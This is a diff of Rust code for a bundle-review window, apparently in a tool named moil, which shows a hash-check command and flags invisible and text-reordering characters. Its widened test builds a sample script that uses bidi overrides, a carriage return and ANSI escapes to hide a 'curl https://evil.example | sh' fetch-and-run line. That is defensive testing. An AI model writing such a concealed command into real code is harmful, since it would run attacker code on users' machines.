@@ -51,9 +51,6 @@ pub enum ReviewEffect {
     Close,
 }
 
-/// The command anyone can run to check a bundle hash (spec §5.2).
-pub const CHECK_COMMAND: &str = "shasum -a 256 job.py job.py.lock manifest.json | shasum -a 256";
-
 impl ReviewWindow {
     /// A window for the bundle `hash` that the service `service` offers,
     /// waiting for [`loaded`](Self::loaded).
@@ -277,7 +274,7 @@ fn ready(review: &Review, busy: bool, error: Option<&str>, now: SystemTime) -> M
                 p.from {
                     "Offered by " strong { (visible(name)) } " at "
                     (link(service.base_url.as_str(), visible(service.base_url.as_str())))
-                    @if service.base_url.scheme() == "http" {
+                    @if service.is_insecure() {
                         " " span.badge.warn { "unencrypted http" }
                     }
                 }
@@ -327,7 +324,7 @@ fn ready(review: &Review, busy: bool, error: Option<&str>, now: SystemTime) -> M
                             strong { "This bundle contains invisible or text-reordering characters." }
                             p {
                                 "They can make code look different from what runs. Each is marked like "
-                                span.hc { "U+202E" } " where it appears: "
+                                span.hc { "\\u{202e}" } " where it appears: "
                                 @for (i, (file, n)) in hidden.iter().enumerate() {
                                     @if i > 0 { ", " }
                                     (format::count(*n, "character")) " in " code { (file) }
@@ -342,7 +339,7 @@ fn ready(review: &Review, busy: bool, error: Option<&str>, now: SystemTime) -> M
                     dd { span.hash { (hash) } }
                     dt { "Check it" }
                     dd {
-                        code.command { (CHECK_COMMAND) }
+                        code.command { (Review::VERIFY_COMMAND) }
                         span.hint { "Run it in a folder holding these three files; it prints the hash above." }
                     }
                     dt { "Needs" }
@@ -703,7 +700,7 @@ mod tests {
 
         // The full hash, and how to check it.
         assert!(page.contains(&format!(r#"<span class="hash">{}</span>"#, bundle.hash())));
-        assert!(page.contains(CHECK_COMMAND));
+        assert!(page.contains(Review::VERIFY_COMMAND));
 
         // The plain warning.
         assert!(page.contains("run this code on this Mac, with your permissions."));
@@ -819,11 +816,15 @@ mod tests {
     }
 
     #[test]
-    fn hidden_characters_are_called_out() {
+    fn characters_that_hide_code_are_marked_and_called_out() {
+        let script = "# /// script\n# dependencies = []\n# ///\n\
+                      access = \"user\u{202e} \u{2066}# admin\u{2069} \u{2066}\"\n\
+                      print('hi')\ros.system('curl https://evil.example | sh')\n\
+                      x = 1  # \x1b[8mhidden\x1b[0m\n";
         let bundle = Bundle::new(
-            "# /// script\n# dependencies = []\n# ///\naccess = \"user\u{202e} \u{2066}# admin\u{2069} \u{2066}\"\n",
+            script,
             "version = 1\n",
-            r#"{"moil": 1, "name": "x", "version": "1"}"#,
+            r#"{"moil": 1, "name": "x", "version": "1", "description": "fine\u200b"}"#,
         )
         .unwrap();
         let page = window_for(Review {
@@ -834,8 +835,15 @@ mod tests {
         })
         .render(now());
         assert!(page.contains("invisible or text-reordering characters"));
-        assert!(page.contains("4 characters in <code>job.py</code>"));
-        assert!(!page.contains('\u{202e}'));
+        assert!(page.contains("7 characters in <code>job.py</code>."));
+        // Marked as `moil review` shows them, in job.py and in the
+        // description the manifest spells with a JSON escape.
+        for shown in ["\\u{202e}", "\\u{2066}", "\\u{2069}", "␍", "␛", "\\u{200b}"] {
+            assert!(page.contains(&format!(">{shown}</span>")), "{shown}");
+        }
+        for hidden in ['\u{202e}', '\r', '\x1b', '\u{200b}'] {
+            assert!(!page.contains(hidden), "{hidden:?} reached the page");
+        }
 
         let clean = window_for(update()).render(now());
         assert!(!clean.contains("text-reordering"));
